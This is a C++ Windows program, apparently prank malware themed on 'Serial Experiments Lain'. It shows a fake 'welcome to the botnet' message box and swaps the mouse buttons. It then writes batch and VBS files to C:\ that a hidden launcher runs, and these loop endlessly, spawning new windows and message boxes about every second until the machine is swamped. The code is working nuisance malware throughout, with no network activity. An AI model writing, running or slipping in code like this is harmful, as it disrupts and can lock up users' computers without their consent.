#include <iostream>

using namespace std;

int main() {

    cout << R"( 
        /\_/\  
       ( o.o ) 
        > ^ <
    )" << endl;
    system("echo Msgbox \"Felicidades, ahora formas parte de la botnet. Digo... la wired :)\",0+0,\"Welcome to the botnet\" >> msg.vbs");
    system("start msg.vbs");

    // Changes the mouse buttons (this will kinda annoying for the user hahaha)
    system("RUNDLL32 USER32.DLL,SwapMouseButton");

    // Creates the "LET'S ALL LOVE LAIN" folder in C:\ drive
    system("mkdir C:\\\"LET'S ALL LOVE LAIN\" >nul 2>&1");

    // Creates the "LALL.bat" file in the "LET'S ALL LOVE LAIN" folder
    system("echo @echo off > C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    system("echo :lall >> C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    for (int i = 0; i < 66; ++i) {
        system("echo echo LET'S ALL LOVE LAIN >> C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    }
    system("echo PING -n 5 127.0.0.1^>nul>>C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    system("echo pause >> C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    system("echo GOTO :lall >> C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");
    system("start C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat");

    system("echo No te preocupes, nada de esto es real... O si?");

    // Creates the "chisa.vbs" file in the "LET'S ALL LOVE LAIN" folder
    system("echo Set WshShell = CreateObject(\"WScript.Shell\") > C:\\\"LET'S ALL LOVE LAIN\"\\chisa.vbs && echo WshShell.Run \"\"\"C:\\\\LET'S ALL LOVE LAIN\\\\viejo_choto.bat\"\"\", 0, False >> C:\\\"LET'S ALL LOVE LAIN\"\\chisa.vbs");

    // Creates the "lain.vbs" file in the "LET'S ALL LOVE LAIN" folder
    system("echo Msgbox \"I'M THE REAL LAIN I'M THE REAL LAIN I'M THE REAL LAIN I'M THE REAL LAIN I'M THE REAL LAIN I'M THE REAL LAIN I'M THE REAL LAIN\",0+0,\"I'M LAIN\" >> C:\\\"LET'S ALL LOVE LAIN\"\\lain.vbs");
    
    // Creates the "viejo_choto.bat" file in the "LET'S ALL LOVE LAIN" folder
    // You can modify the PING -n <seconds> 127.0.0.1^>null to change the time between the execution
    system("echo @echo off > C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");
    system("echo :lall >> C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");
    system("echo start C:\\\"LET'S ALL LOVE LAIN\"\\lain.vbs >> C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");
    system("echo start C:\\\"LET'S ALL LOVE LAIN\"\\LALL.bat >> C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");
    system("echo PING -n 1 127.0.0.1^>nul>>C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");
    system("echo GOTO :lall >> C:\\\"LET'S ALL LOVE LAIN\"\\viejo_choto.bat");

    system("start C:\\\"LET'S ALL LOVE LAIN\"\\chisa.vbs");

    system("pause");
    system("del msg.vbs");

    return 0;
}